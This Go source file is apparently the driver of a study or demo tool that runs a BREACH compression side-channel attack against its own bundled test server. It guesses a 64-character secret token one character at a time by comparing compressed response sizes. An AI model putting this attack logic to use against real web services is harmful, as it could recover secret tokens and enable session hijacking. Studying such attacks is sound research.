package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	"sort"
	"time"
	
	client "github.com/larikuistio/cryptopener/client"
	testserver "github.com/larikuistio/cryptopener/testserver"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken string
	guess_count int
	correct_count int
}

type Guess struct {
	size int
	char string
}

type GuessArray [62]Guess

var guesses GuessArray

func (g GuessArray) Len() int {
    return len(g)
}

func (g GuessArray) Less(i, j int) bool {
    return g[i].size < g[j].size
}

func (g GuessArray) Swap(i, j int) {
    g[i], g[j] = g[j], g[i]
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte, payload string) {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)

	if p.guess_count < 62 {
		guesses[p.guess_count].size = int(size)
		guesses[p.guess_count].char = payload[len(payload) - 1:]
		p.guess_count++

		if p.guess_count == 62 {
			sort.Sort(GuessArray(guesses))
			log.Printf("Next correct character is %s", guesses[0].char)
			p.ResultToken = p.ResultToken + guesses[0].char
			p.correct_count++
			p.guess_count = 0
			log.Printf("Result token is currently %s", p.ResultToken)
			time.Sleep(2 * time.Second)
		}
	}
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	go testserver.TestServer()
	p.ResultToken = ""
	p.guess_count = 0
	p.correct_count = 0
	for {
		// create new payload
		payload, _ := p.mutator.NewPayload(false)
		log.Printf("Sending payload: %s", string(payload))
		// send payload into a socket and then response into channel
		response := p.client.SendMessage(string(payload))
		p.analyseResponse(response, string(payload))
		
		if p.correct_count == 64 {
			log.Printf("The token is %s", p.ResultToken)
			break
		}
	}
}
